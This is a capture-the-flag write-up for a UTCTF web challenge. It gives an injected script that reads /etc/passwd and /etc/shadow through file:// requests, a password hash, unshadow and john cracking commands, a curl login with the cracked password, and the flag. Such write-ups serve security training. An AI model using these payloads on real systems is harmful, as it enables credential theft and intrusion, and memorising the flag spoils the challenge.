#### Challenge:

My friend bet me I couldn't pwn this site. Can you help me break in?

(bruteforcing is not necessary or helpful to solve this problem) `http://web2.utctf.live:9854`

---

#### Solution:

- playing with web page reveals that content can be altered via `window.location.href` or via `XMLHttpRequest` making a great `LFI`

```html
<b>LFI</b>

<script>
    let para = document.createElement("p");
    para.innerText = "/etc/passwd.\n\n";
    let xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "file:///etc/passwd", false ); 
    xmlHttp.send( null );
    para.innerText += xmlHttp.responseText;
    document.body.appendChild(para);


    para = document.createElement("p");
    para.innerText = "/etc/shadow.\n\n";
    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "file:///etc/shadow", false ); 
    xmlHttp.send( null );
    para.innerText += xmlHttp.responseText;
    document.body.appendChild(para);
</script>
```

```
WeakPasswordAdmin:$1$Rj9G/TPc$e5k/QAhlagK6pxGyfQNJ5.:1003:1003::/home/WeakPasswordAdmin:/bin/bash
```

```bash
unshadow ./passwd ./shadow > password.txt
john password.txt
curl 'http://web2.utctf.live:9854/admin' -X POST --data-raw 'username=WeakPasswordAdmin&password=sunshine' | grep -i utflag
```

---

<details><summary>FLAG:</summary>

```
utflag{b1g_r3d_t3am_m0v35_0ut_h3r3}
```

</details>
<br/>
